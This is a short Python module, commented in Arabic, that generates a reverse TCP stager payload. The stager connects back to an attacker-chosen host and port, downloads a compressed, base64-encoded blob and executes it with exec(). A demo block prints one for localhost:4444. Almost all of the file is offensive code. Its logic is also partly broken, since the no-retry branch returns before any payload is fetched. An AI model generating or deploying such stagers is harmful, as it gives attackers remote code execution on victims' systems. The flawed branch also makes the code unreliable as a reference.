import socket
import struct
import zlib
import base64
import time
from ..pythons import py_create_exec_stub
class ReverseTcpPayload:
    def __init__(self, lhost, lport, stager_retry_count=0, stager_retry_wait=0):
        self.lhost = lhost
        self.lport = lport
        self.stager_retry_count = stager_retry_count
        self.stager_retry_wait = stager_retry_wait

    def generate(self):
        return self.generate_reverse_tcp()

    def generate_reverse_tcp(self):
        cmd = "import socket, zlib, base64, struct\n"
        if self.stager_retry_wait > 0:
            cmd += "import time\n"

        # إعداد الاتصال بالشبكة
        if self.stager_retry_wait > 0 and self.stager_retry_count > 0:
            cmd += "for _ in range({}):\n".format(self.stager_retry_count)
            cmd += "\ttry:\n"
        elif self.stager_retry_wait > 0:
            cmd += "while True:\n"
            cmd += "\ttry:\n"
        else:
            cmd += "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            cmd += "s.connect(('{}', {}))\n".format(self.lhost, self.lport)
            return cmd  # إذا لم يكن هناك إعادة محاولة، فقط نفذ الاتصال

        # إعادة محاولة الاتصال
        cmd += "\t\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        cmd += "\t\ts.connect(('{}', {}))\n".format(self.lhost, self.lport)
        cmd += "\t\tbreak\n"
        cmd += "\texcept:\n"
        cmd += "\t\ttime.sleep({})\n".format(self.stager_retry_wait)

        # تنفيذ payload المستلم
        cmd += "l = struct.unpack('>I', s.recv(4))[0]\n"
        cmd += "d = s.recv(l)\n"
        cmd += "while len(d) < l:\n"
        cmd += "\td += s.recv(l - len(d))\n"
        cmd += "exec(zlib.decompress(base64.b64decode(d)), {'s': s})\n"

        py_create_exec_stub(cmd)
        return cmd

# استخدام الكلاس
if __name__ == '__main__':
    payload = ReverseTcpPayload('127.0.0.1', 4444, 3, 5)
    payload_code = payload.generate()
    print(payload_code)
